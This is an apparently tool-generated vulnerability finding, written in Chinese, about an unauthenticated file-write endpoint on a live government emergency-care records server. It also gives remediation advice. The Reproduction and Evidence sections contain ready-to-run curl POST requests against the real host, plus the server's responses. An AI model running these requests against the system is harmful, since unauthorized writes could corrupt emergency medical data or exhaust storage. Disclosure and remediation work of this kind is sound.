# epcr.tpf.gov.tw:4001 /videoData POST 未鉴权写端点可触发文件写入

- ID: `5c9e909b-af34-494d-a8fe-3563058111c3`
- Severity: **high**
- Status: open
- Type: 未鉴权写操作（Broken Access Control）
- Target: `https://epcr.tpf.gov.tw:4001/videoData（POST 未鉴权写端点）`
- Conversation: `0e6944a5-643d-4cd9-9a2a-7b1676a25139`
- Created: 2026-09-06 19:07:14.930376661+08:00

## Description

EPCR vitalSignVideoServer（:4001）的 /videoData 端点支持 POST 方法且未做身份/权限校验（无 token 即可调用），必填字段 fileName/fileData/generatedAt。未鉴权 POST 可触发后端文件写入逻辑：参数缺失返回 400 notNull Violation，参数齐全返回 500 "Failed to add file"（写入因 fileData 格式处理失败，但写操作已被触发）。攻击者可未鉴权地触发写入流程、消耗存储/带宽、尝试注入或污染视频数据，属未鉴权写操作。

## Reproduction

1. 执行（无 token）：curl -sSk -X POST -H "Content-Type: application/json" -d '{}' https://epcr.tpf.gov.tw:4001/videoData
   观察返回 400 notNull Violation（列出 fileName/fileData/generatedAt 必填），证明 POST 端点存在且未鉴权。
2. 执行：curl -sSk -X POST -H "Content-Type: application/json" -d '{"fileName":"poc.bin","fileData":"aGVsbG8=","generatedAt":"2025-01-01T00:00:00.000Z"}' https://epcr.tpf.gov.tw:4001/videoData
   观察返回 500 "Failed to add file"（写入逻辑被触发，非 401）。

## Evidence

1. 方法探测（4001）：
POST /videoData -d '{}' → 400 337B {"message":"notNull Violation: fileName cannot be null, notNull Violation: fileData cannot be null, notNull Violation: generatedAt cannot be null","errors":[...]}
PUT/DELETE/PATCH /videoData → 404 160B（仅 POST 有效）
OPTIONS /videoData → 204
2. 未鉴权写入尝试：
POST /videoData -d '{"fileName":"poc_test_2025.bin","fileData":"aGVsbG8gdGVzdA==","generatedAt":"2025-01-01T00:00:00.000Z"}' → 500 60B {"message":"internal error","errors":["Failed to add file"]}
（无 Authorization token，请求被接受并进入写入逻辑，非 401 鉴权拒绝）
3. 对比：4000 上所有 MCi API（/MciPcrs 等）未带 token 均 401，而 4001 /videoData POST 无 token 也能触发写入逻辑。

## Impact

1) 未鉴权写操作：攻击者无需凭证即可触发 /videoData 的文件写入流程。
2) 潜在数据污染/注入：若 fileData 格式正确，可能写入攻击者控制的视频数据（污染急救影音库）。
3) DoS：大量 POST 消耗存储/带宽/文件句柄。
4) 与 4001 /videoData 未鉴权读取（已记录）组合，攻击者可读可写急救影音数据。

## Recommendation

1) 为 /videoData（及 /imageData）的 POST/PUT/DELETE 等写方法增加身份认证与权限校验（仅限授权服务端/角色写入）。
2) 对 fileData 做严格类型/大小校验与内容验证。
3) 限制未鉴权写入速率，防止存储耗尽。
